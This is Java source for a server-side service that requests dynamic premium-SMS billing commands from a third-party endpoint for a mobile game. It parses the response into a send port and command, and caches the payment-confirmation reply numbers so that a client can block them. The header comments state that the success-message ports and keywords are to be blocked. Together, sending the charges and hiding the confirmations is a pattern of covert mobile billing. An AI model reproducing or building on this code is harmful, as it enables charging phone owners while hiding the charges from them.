package com.hytx.service.client;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpException;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.lang3.StringUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;

import com.hytx.cache.ThreadLocalCache;
import com.hytx.constance.BaseContance;
import com.hytx.constance.DictKeyInfo;
import com.hytx.dto.client.BaseReqDto;
import com.hytx.model.baseConf.Dict;
import com.hytx.model.baseConf.Operate;
import com.hytx.model.baseConf.OperateKeyword;
import com.hytx.model.client.ReqSms;
import com.hytx.model.client.ReqSmsCommand;
import com.hytx.service.baseConf.IDictService;

/****
 * 手游世纪移动动态指令请求短串处理类
 * 请求实例：http://14.17.74.124:10011/xcMMBilling.aspx?imei=898601234567811
 * &imsi=460025080210702&chargeId=10799
 *
 * 备注： chargeId计费id又我方提供
 *
 * 1、访问后： 返回内容 “error” 则获取失败。
 *
 * 否则 则成功 "1065842410<:>20150612762203<:>10658800@10086<:>调皮小动物@成功购买"
 * 备注：以“<:>”这个作为分割字符串 1065842410 这个是发送端口号；(weimi上没作用)
 *
 * 20150612762203 这个为paycode；
 *
 * 10658800@10086 是支付成功下行端口号 存在多个端口号以“@”做为分割 需要屏蔽;
 *
 * 调皮小动物@成功购买 是支付成功下行短信中的关键字以“@”做为分割 需要屏蔽；
 *
 * 备注：发送端口 计费指令 屏蔽关键字 请从我方服务器返回的内容里解析
 * 
 * @author houzz
 *
 */
@Service("dynamicOperateMobileSysj")
public class DynamicOperateMobileSysj implements IDynamicOperate {
	private Logger logger = LoggerFactory.getLogger("CLIENT_LOG");
	@Autowired
	@Qualifier("dictServiceImpl")
	private IDictService dictService;
	private final String url = "http://14.17.74.124:10011/xcMMBilling.aspx?imei=898601234567811";

	@Override
	public ReqSmsCommand getReqSmsCommand(ReqSms smsReq, BaseReqDto baseReqDto,
			Operate dynaOperate) {
		Integer feeValue = dynaOperate.getPrice() == null
				|| dynaOperate.getPrice() < 1 ? smsReq.getFeeValue()
				: dynaOperate.getPrice();
		Dict dict = dictService
				.selectActiviteDictByKey(DictKeyInfo.PRE_SYSJ_CHARGEID_KEY
						+ feeValue);
		if (dict == null || dict.getVal() == null) {
			throw new RuntimeException("字典没有配置对应资费的字典key及chargeId值");
		}
		StringBuffer buffer = new StringBuffer(url);
		buffer.append("&imsi=" + smsReq.getImsi());
		buffer.append("&chargeId=" + dict.getVal());
		HttpClient client = new HttpClient();
		client.getParams().setContentCharset("UTF-8");
		PostMethod method = new PostMethod(buffer.toString());
		logger.info("手游世纪移动动态指令请求路径为:" + buffer.toString());
		try {
			client.executeMethod(method);
			if (method.getStatusCode() == HttpStatus.SC_OK) {
				String content = method.getResponseBodyAsString();
				logger.info("请求手游世纪移动动态指令返回数据为:" + content);
				if (!StringUtils.isBlank(content)) {
					String dataArr[] = content.split("<:>");
					String moContent = dataArr[1];
					String moNum = dataArr[0];
					ReqSmsCommand command = new ReqSmsCommand();
					command.setAppId(baseReqDto.getApp().getId());
					command.setFeeValue(feeValue);
					command.setOperateId(dynaOperate.getId());
					command.setOrderId(smsReq.getOrderId());
					command.setPayPointId(smsReq.getPayPointId());
					command.setMoContent(moContent);
					command.setUpdateDt(new Date());
					command.setSendStatus(BaseContance.NOT_ACTIVICE_STATUS);
					if (StringUtils.isBlank(dynaOperate.getFeeCode())) {
						command.setMoNum(moNum);
					} else {
						command.setMoNum(dynaOperate.getFeeCode());
					}
					// 将动态指令的屏蔽信息添加的缓存里
					Map<Integer, List<OperateKeyword>> map = ThreadLocalCache.dynaOpKeyword
							.get();
					if (map == null) {
						map = new HashMap<Integer, List<OperateKeyword>>();
						ThreadLocalCache.dynaOpKeyword.set(map);
					}
					List<OperateKeyword> list = new ArrayList<OperateKeyword>();
					String mtArr[] = dataArr[2].split("@");
					for (int i = 0; i < mtArr.length; i++) {
						OperateKeyword opKey = new OperateKeyword();
						opKey.setOperateId(dynaOperate.getId());
						opKey.setMtNum(mtArr[i]);
						opKey.setMtContent("");// 暂时不根据号码屏蔽
						list.add(opKey);
					}
					map.put(dynaOperate.getId(), list);
					return command;
				}
			}
		} catch (HttpException e) {
			e.printStackTrace();
			logger.error("手游世纪移动动态指令请求 exception:{}", e.getMessage());
		} catch (IOException e) {
			e.printStackTrace();
			logger.error("手游世纪移动动态指令请求  exception:{}", e.getMessage());
		}
		return null;
	}

}
